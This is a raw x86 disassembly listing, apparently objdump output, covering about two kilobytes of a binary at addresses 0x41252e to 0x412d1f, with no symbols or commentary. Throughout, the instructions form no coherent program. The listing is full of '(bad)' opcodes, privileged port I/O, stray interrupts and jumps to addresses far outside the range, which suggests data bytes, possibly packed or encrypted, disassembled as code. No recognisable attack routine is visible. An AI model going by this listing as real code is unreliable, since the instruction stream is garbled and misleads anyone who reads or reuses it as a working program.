  41252e:	or     ebx,DWORD PTR [ebx]
  412530:	push   esp
  412531:	outs   dx,DWORD PTR ds:[esi]
  412532:	sub    edx,DWORD PTR [ebx-0x4]
  412535:	jle    0x41250f
  412537:	cmp    BYTE PTR [ebx],dl
  412539:	sub    BYTE PTR [ecx-0x57],dl
  41253c:	mov    WORD PTR [esi],?
  41253e:	cmp    ecx,DWORD PTR [edi-0x6d57e765]
  412544:	test   DWORD PTR [esi-0x29c11535],edx
  41254a:	in     eax,0x34
  41254c:	push   esi
  41254d:	or     esp,DWORD PTR [edx+eax*8-0x58]
  412551:	call   0x3781b5aa
  412556:	or     DWORD PTR [ebx+0x72028e5c],edx
  41255c:	fdiv   DWORD PTR [edx+edx*2-0x7e5f7738]
  412563:	jbe    0x41259d
  412565:	leave  
  412566:	xor    eax,0x9654a5fa
  41256b:	int    0x25
  41256d:	jg     0x4125ac
  41256f:	push   cs
  412570:	mov    BYTE PTR [esp+ebx*4],ch
  412573:	inc    ebx
  412574:	sbb    DWORD PTR [esi+0x70fb721],0x9d3cc6de
  41257e:	scas   eax,DWORD PTR es:[edi]
  41257f:	xchg   ebx,eax
  412580:	int3   
  412581:	xor    esi,DWORD PTR [esi-0x468cfff0]
  412587:	push   eax
  412588:	dec    ebx
  412589:	lock nop ecx
  41258d:	stos   BYTE PTR es:[edi],al
  41258e:	pop    ebp
  41258f:	test   eax,0x25cd6bc6
  412594:	xor    al,0xc
  412596:	jge    0x412521
  412598:	push   0xffffffc6
  41259a:	pop    edx
  41259b:	(bad)  
  41259c:	in     eax,dx
  41259d:	xchg   ebx,eax
  41259e:	loopne 0x4125bd
  4125a0:	sub    edx,eax
  4125a2:	sub    BYTE PTR [edx],ch
  4125a4:	fmul   QWORD PTR [esi]
  4125a6:	and    DWORD PTR [ebp-0x60],0xffffffe4
  4125aa:	loop   0x4125ac
  4125ac:	scas   al,BYTE PTR es:[edi]
  4125ad:	fcomp  st(6)
  4125af:	push   0xfb48b4fc
  4125b4:	mov    cl,0xf4
  4125b6:	popa   
  4125b7:	ss mov esp,0x272c38f4
  4125bd:	mov    dl,0xad
  4125bf:	loope  0x41256e
  4125c1:	jnp    0x412598
  4125c3:	outs   dx,DWORD PTR ds:[esi]
  4125c4:	cmc    
  4125c5:	jecxz  0x4125de
  4125c7:	icebp  
  4125c8:	ins    DWORD PTR es:[edi],dx
  4125c9:	mov    ah,0xea
  4125cb:	inc    ecx
  4125cc:	mov    ds:0x95cb2085,al
  4125d1:	mov    cs,WORD PTR [ebx+0x54]
  4125d4:	hlt    
  4125d5:	jmp    0x41255c
  4125d7:	jo     0x4125c3
  4125d9:	js     0x412565
  4125db:	cmp    dl,BYTE PTR [ebp-0xa]
  4125de:	jne    0x41257a
  4125e0:	lock push ebx
  4125e2:	outs   dx,DWORD PTR ds:[esi]
  4125e3:	mov    esi,0x6ddef6e0
  4125e8:	rcr    DWORD PTR [ebx-0xf],1
  4125eb:	jae    0x4125f0
  4125ed:	add    edi,DWORD PTR [ebp-0x4bd49f4b]
  4125f3:	dec    edi
  4125f4:	or     eax,0xc851494b
  4125f9:	out    dx,al
  4125fa:	test   ch,dl
  4125fc:	adc    eax,0xc35dd1f0
  412601:	ins    DWORD PTR es:[edi],dx
  412602:	xlat   BYTE PTR ds:[ebx]
  412603:	push   0x4c1fd924
  412608:	fild   DWORD PTR [eax+0x2f79131d]
  41260e:	out    dx,eax
  41260f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412611:	or     ebp,0x3f45f855
  412617:	mov    eax,ds:0x3ec4d0c0
  41261c:	fwait
  41261d:	mov    esi,0x68265893
  412622:	inc    edx
  412623:	cdq    
  412624:	int    0xb8
  412626:	cmp    eax,0xa39c911e
  41262b:	bound  edx,QWORD PTR [edx]
  41262d:	lahf   
  41262e:	dec    esp
  41262f:	fbld   TBYTE PTR [edi]
  412631:	jnp    0x4126b0
  412633:	xchg   edx,eax
  412634:	or     DWORD PTR [eax-0xc],edx
  412637:	push   esi
  412638:	cdq    
  412639:	mov    ecx,0x8934118e
  41263e:	cli    
  41263f:	and    al,0xb9
  412641:	stos   DWORD PTR es:[edi],eax
  412642:	mov    bh,0x79
  412644:	test   BYTE PTR [edx],bl
  412646:	pop    ecx
  412647:	or     edx,DWORD PTR ds:[ebx]
  41264a:	dec    edx
  41264b:	loope  0x412613
  41264d:	push   esp
  41264e:	leave  
  41264f:	ja     0x412647
  412651:	aam    0x40
  412653:	push   edx
  412654:	xchg   esp,eax
  412655:	nop
  412656:	xchg   ebx,eax
  412657:	test   eax,0x2f5a5930
  41265c:	dec    ebx
  41265d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41265e:	pop    ss
  41265f:	pop    ds
  412660:	arpl   cx,dx
  412662:	cdq    
  412663:	mov    edx,0xfc61d32b
  412668:	outs   dx,DWORD PTR ds:[esi]
  412669:	mov    ecx,0x1b00176a
  41266e:	cs out dx,eax
  412670:	xchg   ecx,eax
  412671:	and    eax,ecx
  412673:	push   DWORD PTR [eax+0x2e730b39]
  412679:	mov    ebp,0x6a0125d3
  41267e:	lea    ebp,[esi+0x4d]
  412681:	stos   BYTE PTR es:[edi],al
  412682:	sbb    al,0x55
  412684:	push   esi
  412685:	and    BYTE PTR ds:0xd9ad1815,dl
  41268b:	add    BYTE PTR [edx+0x7f6f5ff7],ch
  412691:	and    DWORD PTR [ecx+0x3f],edi
  412694:	mov    eax,0x318bc9b6
  412699:	out    0x7c,eax
  41269b:	hlt    
  41269c:	cmp    dh,BYTE PTR [ebx+ebp*8-0x40513389]
  4126a3:	neg    DWORD PTR [ebp-0x3]
  4126a6:	fwait
  4126a7:	jge    0x412701
  4126a9:	clc    
  4126aa:	shr    BYTE PTR [edx],1
  4126ac:	frstor [ebp-0x4a844678]
  4126b2:	cwde   
  4126b3:	push   ebx
  4126b4:	dec    edx
  4126b5:	bound  ecx,QWORD PTR ss:[ebp-0x32]
  4126b9:	push   cs
  4126ba:	daa    
  4126bb:	jle    0x412715
  4126bd:	in     eax,dx
  4126be:	jmp    0x41269b
  4126c0:	loopne 0x41267a
  4126c2:	ins    BYTE PTR es:[edi],dx
  4126c3:	inc    esi
  4126c4:	retf   0x6728
  4126c7:	ret    0x5323
  4126ca:	dec    ebx
  4126cb:	or     eax,0x16642a41
  4126d0:	sub    BYTE PTR [eax-0x74],bh
  4126d3:	push   ecx
  4126d4:	stos   DWORD PTR es:[edi],eax
  4126d5:	dec    ecx
  4126d6:	outs   dx,BYTE PTR ds:[esi]
  4126d7:	mov    dl,0xf1
  4126d9:	adc    dh,bl
  4126db:	clc    
  4126dc:	and    DWORD PTR [eax-0x55],edx
  4126df:	add    al,0xda
  4126e1:	ret    0x178c
  4126e4:	inc    ecx
  4126e5:	int3   
  4126e6:	(bad)  
  4126e7:	and    eax,0x55ced5d9
  4126ec:	pop    edi
  4126ed:	call   0xdc1fb97
  4126f2:	jno    0x412765
  4126f4:	push   0xc6374a9b
  4126f9:	dec    esi
  4126fa:	ret    0xa62f
  4126fd:	stos   DWORD PTR es:[edi],eax
  4126fe:	mov    bh,0x5d
  412700:	or     edx,DWORD PTR [esi+0x61]
  412703:	add    al,0x4c
  412705:	push   esp
  412706:	inc    esi
  412707:	jns    0x412709
  412709:	and    ecx,esp
  41270b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41270c:	inc    edx
  41270d:	xchg   ebp,eax
  41270e:	arpl   ax,dx
  412710:	aad    0x3e
  412712:	lds    ebp,FWORD PTR [esi-0x6ae6a8b7]
  412718:	xchg   edi,eax
  412719:	mov    dh,0xc6
  41271b:	retf   
  41271c:	mov    ebx,0xa0fd5cd6
  412721:	fisttp DWORD PTR [ebp-0x68c97204]
  412727:	pop    edi
  412728:	sub    DWORD PTR [eax],edx
  41272a:	out    dx,eax
  41272b:	mov    ds:0x65489e95,al
  412730:	jmp    0x75861f08
  412735:	dec    ebp
  412736:	mov    dh,0x3a
  412738:	scas   eax,DWORD PTR es:[edi]
  412739:	or     eax,0xcba83a74
  41273e:	lock addr16 lahf 
  412741:	jle    0x412726
  412743:	fdiv   DWORD PTR [edx+ebx*2]
  412746:	sub    DWORD PTR [ecx],eax
  412748:	xlat   BYTE PTR ds:[ebx]
  412749:	jmp    0xd7e91f49
  41274e:	bound  edi,QWORD PTR [eax+0x53c677b5]
  412754:	lea    eax,[ecx]
  412756:	sub    bl,BYTE PTR [edi+0x68]
  412759:	or     al,0x42
  41275b:	dec    edi
  41275c:	xor    ah,BYTE PTR [ebx-0x1c3071c0]
  412762:	jecxz  0x4127ab
  412764:	and    al,0xaa
  412766:	jge    0x4126ec
  412768:	sub    eax,0xc7c21a6a
  41276d:	push   ecx
  41276e:	mov    cl,cl
  412770:	in     al,0x84
  412772:	repz fst QWORD PTR [ebx+0xde3ae85]
  412779:	sbb    DWORD PTR [esi+0x1f],esp
  41277c:	bound  eax,QWORD PTR [edx-0x357bb502]
  412782:	enter  0xb97c,0xc9
  412786:	mov    ah,0x8
  412788:	leave  
  412789:	xchg   BYTE PTR [ebx-0xe],dl
  41278c:	fidivr DWORD PTR [ebx]
  41278e:	inc    edx
  41278f:	js     0x412760
  412791:	mov    eax,ds:0xab9c0c4a
  412796:	loopne 0x4127b6
  412798:	ret    0x6d75
  41279b:	cli    
  41279c:	or     eax,0x1c04d6f8
  4127a1:	loope  0x4127ae
  4127a3:	mov    eax,ds:0x994f0a07
  4127a8:	ins    DWORD PTR es:[edi],dx
  4127a9:	stos   DWORD PTR es:[edi],eax
  4127aa:	cmp    ch,al
  4127ac:	jmp    0x4127fd
  4127ae:	loopne 0x412754
  4127b0:	push   0x5fb90632
  4127b5:	sub    DWORD PTR [eax],0x5d
  4127b8:	adc    eax,0x11a7d59f
  4127bd:	push   0x1c
  4127bf:	js     0x412816
  4127c1:	inc    ebx
  4127c2:	sub    ecx,DWORD PTR [edi+0x1b9b3065]
  4127c8:	clc    
  4127c9:	ret    
  4127ca:	out    dx,eax
  4127cb:	shr    DWORD PTR [ebp-0x6e],0xed
  4127cf:	mov    edi,0x10b10ab1
  4127d4:	lods   al,BYTE PTR ds:[esi]
  4127d5:	mov    DWORD PTR [edi-0x1b],ecx
  4127d8:	sbb    DWORD PTR ds:0xa3daaac7,ebx
  4127de:	dec    ebp
  4127df:	nop
  4127e0:	fwait
  4127e1:	jle    0x412792
  4127e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127e4:	arpl   WORD PTR [eax],ax
  4127e6:	pop    es
  4127e7:	imul   ebx,DWORD PTR [ebp+0x475c4af5],0x24763de3
  4127f1:	out    0xee,eax
  4127f3:	in     eax,dx
  4127f4:	cmp    edi,DWORD PTR [ebx+0x6c]
  4127f7:	scas   al,BYTE PTR es:[edi]
  4127f8:	xlat   BYTE PTR ds:[ebx]
  4127f9:	and    eax,0x4e833d75
  4127fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127ff:	or     DWORD PTR [ecx-0x395fcaa4],edi
  412805:	xchg   ebx,eax
  412806:	push   edi
  412807:	or     cl,BYTE PTR ds:0x314a6ca6
  41280d:	hlt    
  41280e:	mov    fs,WORD PTR [esi]
  412810:	cld    
  412811:	mov    ebx,0x8ac2d19e
  412816:	sub    DWORD PTR [eax],0x6f
  412819:	mov    ds:0xda775cfd,eax
  41281e:	jg     0x412820
  412820:	aas    
  412821:	mov    bh,0x16
  412823:	out    0xc2,al
  412825:	or     dl,bl
  412827:	push   cs
  412828:	add    eax,0x890b239e
  41282d:	xor    ch,0xa7
  412830:	cs push ecx
  412832:	and    al,0xf6
  412834:	xor    eax,0x7cd530d
  412839:	mov    ch,0x5c
  41283b:	push   ecx
  41283c:	lods   al,BYTE PTR ss:[esi]
  41283e:	mov    DWORD PTR [ebx-0x4ebe68ac],esp
  412844:	dec    edx
  412845:	rol    DWORD PTR ds:0x4faa532f,0x2f
  41284c:	xor    BYTE PTR [ecx+edx*1+0x10],cl
  412850:	fisub  DWORD PTR [esi+0x7206c895]
  412856:	and    ebx,ebx
  412858:	dec    esp
  412859:	pop    es
  41285a:	popa   
  41285b:	or     eax,0x89ad1cac
  412860:	jne    0x4127f0
  412862:	xchg   BYTE PTR [ecx-0x394958f3],bl
  412868:	(bad)  
  412869:	mov    edi,0x5f5f38a7
  41286e:	sbb    ecx,DWORD PTR [ebp+edi*4+0x59f8a553]
  412875:	or     esp,DWORD PTR [eax-0x369df1bf]
  41287b:	inc    ecx
  41287c:	mov    ebx,0xc1c36f78
  412881:	sbb    al,0xa7
  412883:	pop    ebx
  412884:	xchg   ecx,eax
  412885:	dec    esi
  412886:	js     0x41282f
  412888:	jecxz  0x412810
  41288a:	repnz mov al,ds:0xc97c4715
  412890:	and    esp,DWORD PTR [ebp-0x6eae7509]
  412896:	mov    ch,0x53
  412898:	mov    dl,0x5
  41289a:	jae    0x4128e3
  41289c:	mov    edx,DWORD PTR [edx+0x7e]
  41289f:	xor    al,BYTE PTR [eax]
  4128a1:	jb     0x4128b8
  4128a3:	(bad)  
  4128a4:	push   0x4
  4128a6:	push   ecx
  4128a7:	mov    esp,0xd146179e
  4128ac:	jmp    0x9a9b4a0a
  4128b1:	adc    esp,DWORD PTR [ecx-0x65a84454]
  4128b7:	stc    
  4128b8:	mov    BYTE PTR [ecx+0x345e56f5],ch
  4128be:	mov    ebp,0x28f70b5a
  4128c3:	ror    DWORD PTR [edi-0x39b3ee8c],cl
  4128c9:	pop    ds
  4128ca:	cmp    DWORD PTR [eax+0x6c],0xf39f0ae7
  4128d1:	nop
  4128d2:	pop    edx
  4128d3:	or     DWORD PTR [edi],eax
  4128d5:	bound  esi,QWORD PTR [ecx]
  4128d7:	test   al,0xe0
  4128d9:	and    esi,esi
  4128db:	mov    ds:0xacad73da,eax
  4128e0:	lea    esi,[ecx+eiz*8-0xe945d61]
  4128e7:	pop    ebx
  4128e8:	inc    ebx
  4128e9:	or     eax,0x3339ef
  4128ee:	pop    es
  4128ef:	test   DWORD PTR [edx-0x6a7d6664],0x5603b80d
  4128f9:	mov    esi,0x10fa790
  4128fe:	loopne 0x4128bb
  412900:	xor    eax,0x7897128b
  412905:	addr16 jbe 0x412981
  412908:	cdq    
  412909:	cmp    DWORD PTR [edi-0x20d6adb3],edi
  41290f:	shr    eax,cl
  412911:	test   DWORD PTR [edi-0x14],edi
  412914:	gs jne 0x4128bc
  412917:	repnz (bad) 
  412919:	xchg   esi,eax
  41291a:	and    al,0xc2
  41291c:	and    BYTE PTR [esi-0x39],bl
  41291f:	mov    ?,WORD PTR [ebp-0x34cacafd]
  412925:	cmp    BYTE PTR [eax+0x6f],ch
  412928:	and    eax,0xf166d689
  41292d:	(bad)  
  41292e:	cmp    al,0xa1
  412930:	mov    ds:0x4a94a31b,al
  412935:	in     al,dx
  412936:	psubsw mm1,QWORD PTR [eax+edi*8+0x30]
  41293b:	cdq    
  41293c:	sti    
  41293d:	jecxz  0x4129a7
  41293f:	push   ds
  412940:	mov    bh,0xbe
  412942:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412944:	inc    DWORD PTR [esp+ebp*1]
  412947:	xchg   BYTE PTR [eax+0x1d704a30],dl
  41294d:	repnz xlat BYTE PTR ds:[ebx]
  41294f:	cmc    
  412950:	loope  0x412941
  412952:	or     al,0xb8
  412954:	sbb    BYTE PTR [esi-0x79424de2],ch
  41295a:	sbb    esi,DWORD PTR [ecx-0x3e]
  41295d:	or     eax,esi
  41295f:	mul    ecx
  412961:	push   ss
  412962:	jb     0x412916
  412964:	pop    ds
  412965:	in     al,dx
  412966:	cld    
  412967:	xchg   ebp,eax
  412968:	ss aaa 
  41296a:	or     edx,DWORD PTR [ebp+ebx*1+0x2fb958e4]
  412971:	xchg   ebx,eax
  412972:	lock ins BYTE PTR es:[edi],dx
  412974:	jb     0x412982
  412976:	push   esp
  412977:	pop    ebx
  412978:	fs sub BYTE PTR gs:[edx-0x50],cl
  41297d:	or     bl,0xe4
  412980:	je     0x412978
  412982:	out    0x1d,al
  412984:	test   al,0x2d
  412986:	xor    eax,0x2f87a920
  41298b:	push   esp
  41298c:	xor    al,0xb0
  41298e:	pop    ecx
  41298f:	dec    DWORD PTR [eax-0x28b2c511]
  412995:	je     0xa39e76c1
  41299b:	not    bl
  41299d:	push   esi
  41299e:	icebp  
  41299f:	dec    ecx
  4129a0:	loopne 0x412978
  4129a2:	sub    BYTE PTR [ebx-0x7a],bh
  4129a5:	dec    BYTE PTR [ebx+0x3e1712c]
  4129ab:	cmp    BYTE PTR [ecx+ebx*8+0x4998c80f],0x65
  4129b3:	sbb    ah,dh
  4129b5:	(bad)  
  4129b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129b7:	inc    esi
  4129b8:	jae    0x41299c
  4129ba:	push   ecx
  4129bb:	loope  0x412941
  4129bd:	cdq    
  4129be:	xor    al,0x31
  4129c0:	in     al,dx
  4129c1:	nop
  4129c2:	push   ds
  4129c3:	cmp    al,0x74
  4129c5:	push   edx
  4129c6:	xchg   DWORD PTR [eax],ebp
  4129c8:	test   DWORD PTR [edi],ecx
  4129ca:	mov    cl,0x4b
  4129cc:	jp     0x412962
  4129ce:	mov    al,ds:0xd3f9c7d4
  4129d3:	ds inc ebp
  4129d5:	push   eax
  4129d6:	sub    BYTE PTR [edx-0x61],ah
  4129d9:	(bad)  
  4129db:	mov    ds:0xcf478bdd,eax
  4129e0:	pop    eax
  4129e1:	mov    bl,0x79
  4129e3:	cmp    eax,0x945d7d43
  4129e8:	sahf   
  4129e9:	call   0x9e33c452
  4129ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129ef:	dec    ebp
  4129f0:	leave  
  4129f1:	or     ch,BYTE PTR [eax-0x51]
  4129f4:	or     BYTE PTR [ebx+ebx*1-0x23c43a26],al
  4129fb:	dec    ebp
  4129fc:	cmc    
  4129fd:	mov    ds:0x7807f96c,al
  412a02:	xchg   ebx,eax
  412a03:	add    esp,esp
  412a05:	dec    esp
  412a06:	jl     0x412a4f
  412a08:	fld    QWORD PTR [ecx+0x2807ddb5]
  412a0e:	clc    
  412a0f:	inc    edx
  412a10:	xlat   BYTE PTR ds:[ebx]
  412a11:	xchg   BYTE PTR [ebx+0x76],ch
  412a14:	(bad)  
  412a15:	jg     0x4129d5
  412a17:	sub    DWORD PTR [ebp-0x11],eax
  412a1a:	(bad)  
  412a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a1c:	ins    BYTE PTR es:[edi],dx
  412a1d:	push   esi
  412a1e:	and    ebp,edx
  412a20:	jno    0x412a59
  412a22:	mov    bh,0x9
  412a24:	mov    al,ds:0x4077eaa3
  412a29:	mov    ah,0x9f
  412a2b:	daa    
  412a2c:	add    BYTE PTR [edi],ch
  412a2e:	sahf   
  412a2f:	or     al,0xdb
  412a31:	lds    ecx,FWORD PTR [edx]
  412a33:	add    al,0xd
  412a35:	imul   edi,DWORD PTR [esi+0x46],0xffffff83
  412a39:	scas   eax,DWORD PTR es:[edi]
  412a3a:	(bad)  
  412a3c:	xchg   ebx,eax
  412a3d:	sti    
  412a3e:	fist   DWORD PTR [ebx+ebp*1-0x3d]
  412a42:	lea    ebp,[edi+0x3b267bc7]
  412a48:	cld    
  412a49:	mov    ebx,0xeac2f989
  412a4e:	sub    dh,BYTE PTR [ebx-0x38f4fdf7]
  412a54:	rol    ebp,cl
  412a56:	loop   0x412a44
  412a58:	xchg   edx,eax
  412a59:	and    eax,DWORD PTR [edx+0x3ada23ab]
  412a5f:	mov    ebp,cs
  412a61:	imul   edx
  412a63:	mov    ch,0x51
  412a65:	icebp  
  412a66:	nop
  412a67:	data16 clc 
  412a69:	pop    esp
  412a6a:	das    
  412a6b:	fidiv  DWORD PTR ds:0x35f6018
  412a71:	fsub   st,st(4)
  412a73:	cwde   
  412a74:	hlt    
  412a75:	jnp    0x412aaa
  412a77:	fldl2e 
  412a79:	or     al,0xb9
  412a7b:	and    DWORD PTR ds:[edx+0x11c9ad5e],ecx
  412a82:	dec    esi
  412a83:	int3   
  412a84:	push   0x68d6499
  412a89:	jge    0x412afe
  412a8b:	or     BYTE PTR [eax+eax*2+0x3e],bl
  412a8f:	retf   
  412a90:	mov    dh,0x36
  412a92:	stc    
  412a93:	push   eax
  412a94:	stos   DWORD PTR es:[edi],eax
  412a95:	add    cl,ch
  412a97:	xor    eax,ebx
  412a99:	inc    esp
  412a9a:	sbb    BYTE PTR [ebx+0x59e4e6f6],0xf6
  412aa1:	push   ebx
  412aa2:	mov    esi,0x1a4fdb17
  412aa7:	mov    ah,ah
  412aa9:	and    eax,0xa16d490
  412aae:	jg     0x412aca
  412ab0:	xlat   BYTE PTR ds:[ebx]
  412ab1:	inc    ecx
  412ab2:	aad    0xe4
  412ab4:	push   ebx
  412ab5:	mov    DWORD PTR [esi-0x34],ebx
  412ab8:	fcomp  st(0)
  412aba:	lods   eax,DWORD PTR ds:[esi]
  412abb:	adc    al,0x23
  412abd:	or     DWORD PTR [ecx],0xfffffff7
  412ac0:	enter  0x49d6,0x9e
  412ac4:	dec    esi
  412ac5:	xchg   BYTE PTR [edi+0x34],dh
  412ac8:	popf   
  412ac9:	outs   dx,BYTE PTR ds:[esi]
  412aca:	daa    
  412acb:	push   ss
  412acc:	adc    cl,BYTE PTR [esi]
  412ace:	mov    ch,0x8f
  412ad0:	cmp    DWORD PTR [ebp+0x2edddec],0xffffff80
  412ad7:	jnp    0x412afc
  412ad9:	aam    0xf0
  412adb:	mov    ch,al
  412add:	pxor   mm1,QWORD PTR [esp+eax*8]
  412ae1:	jne    0x412a7c
  412ae3:	xchg   edi,eax
  412ae4:	pop    esi
  412ae5:	call   0x866bfd94
  412aea:	repnz or edi,DWORD PTR [esi]
  412aed:	adc    ebx,DWORD PTR [edi+0x69572891]
  412af3:	enter  0x7d77,0xa
  412af7:	jle    0x412b23
  412af9:	repnz sub BYTE PTR ds:0x5b60b651,dh
  412b00:	(bad)  
  412b01:	lea    eax,[eax-0x7f]
  412b04:	es je  0x412aab
  412b07:	adc    esi,ebx
  412b09:	cmp    esp,DWORD PTR [esi]
  412b0b:	in     eax,0x42
  412b0d:	sbb    eax,0xdb257979
  412b12:	xor    dl,BYTE PTR [esi+0xc]
  412b15:	mov    bl,0xc6
  412b17:	jmp    0xf725701b
  412b1c:	pavgw  mm0,mm4
  412b1f:	and    bh,bh
  412b21:	pop    ds
  412b22:	dec    edx
  412b23:	loop   0x412b67
  412b25:	jge    0x412afe
  412b27:	xor    BYTE PTR [edx-0x7e],bh
  412b2a:	xchg   BYTE PTR [eax+0x4459924],ah
  412b30:	leave  
  412b31:	aad    0x4a
  412b33:	jmp    0x412b77
  412b35:	dec    eax
  412b36:	add    BYTE PTR [edx+0x4c0fcc48],ch
  412b3c:	inc    ebp
  412b3d:	jne    0x412af4
  412b3f:	sub    DWORD PTR [edx-0x1],ebp
  412b42:	and    al,0xe5
  412b44:	mov    bl,BYTE PTR [edi]
  412b46:	jle    0x412b9d
  412b48:	mov    BYTE PTR [ebp-0x72],dl
  412b4b:	adc    eax,0x7ad5c8f
  412b50:	nop
  412b51:	fwait
  412b52:	fwait
  412b53:	jmp    DWORD PTR [edi-0x44587282]
  412b59:	pop    esi
  412b5a:	fwait
  412b5b:	mov    ebx,DWORD PTR [ebx+0x33f9e057]
  412b61:	push   cs
  412b62:	cmp    esi,DWORD PTR [esi]
  412b64:	add    dl,BYTE PTR [eax]
  412b66:	aas    
  412b67:	mov    esp,0x73363dbd
  412b6c:	xchg   DWORD PTR [ecx],edi
  412b6e:	mov    ecx,DWORD PTR [ecx]
  412b70:	jp     0x412b8f
  412b72:	stos   DWORD PTR es:[edi],eax
  412b73:	dec    esp
  412b74:	std    
  412b75:	fist   DWORD PTR [eax]
  412b77:	fcomp  DWORD PTR [edi-0x56]
  412b7a:	out    dx,al
  412b7b:	js     0x412b1e
  412b7d:	pop    ss
  412b7e:	fisubr WORD PTR [edx+0x65]
  412b81:	mov    cl,BYTE PTR ds:[esi-0x18e2eced]
  412b88:	sub    al,0x29
  412b8a:	adc    eax,0x2e8b8357
  412b8f:	cld    
  412b90:	inc    esp
  412b91:	dec    esp
  412b92:	out    0x99,eax
  412b94:	jb     0x412b4a
  412b96:	jmp    0x412bba
  412b98:	pop    edx
  412b99:	mov    ds:0x64c72cff,eax
  412b9e:	adc    BYTE PTR [edx],dh
  412ba0:	shr    BYTE PTR [ecx],cl
  412ba2:	or     eax,0x1d11eab9
  412ba7:	dec    ebx
  412ba8:	or     bh,BYTE PTR [ebx]
  412baa:	ja     0x412c08
  412bac:	mov    ds:0xba0e9d80,eax
  412bb1:	or     ebx,ebx
  412bb3:	add    eax,0x10b94d57
  412bb8:	daa    
  412bb9:	scas   al,BYTE PTR es:[edi]
  412bba:	and    eax,0x86310ef6
  412bbf:	pop    ebp
  412bc0:	cmp    ebx,DWORD PTR [esi-0x7ad5c328]
  412bc6:	test   DWORD PTR [eax-0x33],0x1095e1aa
  412bcd:	std    
  412bce:	sbb    DWORD PTR [edi+esi*1],ebp
  412bd1:	lahf   
  412bd2:	cmp    dh,ah
  412bd4:	aas    
  412bd5:	add    eax,0x8365016a
  412bda:	mov    ebx,0x11c26fe8
  412bdf:	jge    0x412b6f
  412be1:	cli    
  412be2:	gs dec ebp
  412be4:	out    0xb,eax
  412be6:	mov    eax,ds:0xb4b28826
  412beb:	mov    ebx,0x61b3a67d
  412bf0:	imul   eax,DWORD PTR [edi],0x55ccb832
  412bf6:	hlt    
  412bf7:	pop    es
  412bf8:	jge    0x412bc1
  412bfa:	pop    es
  412bfb:	js     0x412b8a
  412bfd:	out    0x69,al
  412bff:	sbb    eax,0x145b4399
  412c04:	jg     0x412bb7
  412c06:	push   ss
  412c07:	mov    ecx,0x2b111639
  412c0c:	mov    edi,0x2d32718f
  412c11:	mov    ch,BYTE PTR ds:0xa0b9abbc
  412c17:	sub    al,0x9c
  412c19:	cmc    
  412c1a:	loope  0x412bca
  412c1c:	data16 fcom QWORD PTR [ebx+edi*8]
  412c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c21:	in     al,dx
  412c22:	add    cl,BYTE PTR [eax]
  412c24:	ins    BYTE PTR es:[edi],dx
  412c25:	and    ebx,DWORD PTR [edx+ecx*1+0x21]
  412c29:	add    eax,0xf49df877
  412c2e:	fs dec eax
  412c30:	jae    0x412bd8
  412c32:	mov    DWORD PTR [eax+0x33e387cc],eax
  412c38:	cmp    BYTE PTR [esi],0x2f
  412c3b:	lds    esp,FWORD PTR [ebx+0x3d]
  412c3e:	sahf   
  412c3f:	add    esp,eax
  412c41:	dec    ecx
  412c43:	or     bh,al
  412c45:	test   DWORD PTR [esi+0x7c],0xa9cc7398
  412c4c:	stos   DWORD PTR es:[edi],eax
  412c4d:	adc    eax,0xbd78aadb
  412c52:	jmp    0x412c9d
  412c54:	push   edx
  412c55:	sbb    BYTE PTR [ebp+0xa],cl
  412c58:	ins    DWORD PTR es:[edi],dx
  412c59:	sub    eax,0x5528ce65
  412c5e:	out    0xa4,al
  412c60:	push   edx
  412c61:	retf   0xae77
  412c64:	cld    
  412c65:	test   eax,0xa67c0036
  412c6a:	cmp    eax,0x9bba572d
  412c6f:	mov    cs,WORD PTR [esi-0xd]
  412c72:	jecxz  0x412c29
  412c74:	mov    DWORD PTR [ecx+0x1037d95d],edi
  412c7a:	in     al,dx
  412c7b:	pop    esi
  412c7c:	dec    ebp
  412c7d:	mov    bh,BYTE PTR [ebp-0x71c4ebc4]
  412c83:	(bad)  
  412c84:	and    eax,0xc0df3a1b
  412c89:	in     eax,0x7a
  412c8b:	loop   0x412c56
  412c8d:	cld    
  412c8e:	jno    0x412ceb
  412c90:	and    eax,0xcc3499dc
  412c95:	ror    BYTE PTR [ebx],0x2e
  412c98:	inc    eax
  412c99:	xchg   esi,eax
  412c9a:	mov    edi,0xe4fcd369
  412c9f:	(bad)  [ebx+0xa9591a1]
  412ca5:	mov    BYTE PTR [ecx+edi*2+0x74647415],bl
  412cac:	sub    al,0xcf
  412cae:	cmc    
  412caf:	adc    edx,eax
  412cb1:	popa   
  412cb2:	jp     0x412cfe
  412cb4:	push   edi
  412cb5:	scas   eax,DWORD PTR es:[edi]
  412cb6:	adc    edi,DWORD PTR [edi+edx*8-0x126dfbcd]
  412cbd:	mov    eax,0xb5ecbd1b
  412cc2:	test   eax,0x1631ac3f
  412cc7:	adc    al,bl
  412cc9:	retf   0xf846
  412ccc:	or     ebx,DWORD PTR [edi+eax*8+0x43a8b9e3]
  412cd3:	addr16 inc edi
  412cd5:	xor    al,0xb
  412cd7:	(bad)  
  412cd8:	pop    ss
  412cd9:	bound  ecx,QWORD PTR [eax]
  412cdb:	mov    edx,0x236279c9
  412ce0:	sahf   
  412ce1:	iret   
  412ce2:	inc    ecx
  412ce3:	mov    ds:0xe1c513ce,eax
  412ce8:	jmp    0x412c94
  412cea:	out    dx,al
  412ceb:	inc    edx
  412cec:	dec    esp
  412ced:	add    BYTE PTR cs:[esi],dh
  412cf0:	out    0xe2,eax
  412cf2:	cs cmp eax,0x4362d3c2
  412cf8:	stc    
  412cf9:	add    al,0x41
  412cfb:	mov    edx,0xd68ad064
  412d00:	or     eax,0x68362316
  412d05:	lock push edx
  412d07:	push   edi
  412d08:	in     al,dx
  412d09:	push   0xda848cd5
  412d0e:	int3   
  412d0f:	or     BYTE PTR [ebx+0x5b404aa],0xa9
  412d16:	add    al,dl
  412d18:	repz mov al,0x7c
  412d1b:	in     eax,dx
  412d1c:	aad    0xf5
  412d1e:	pop    es
  412d1f:	adc    DWORD PTR [edi],0x143362bb
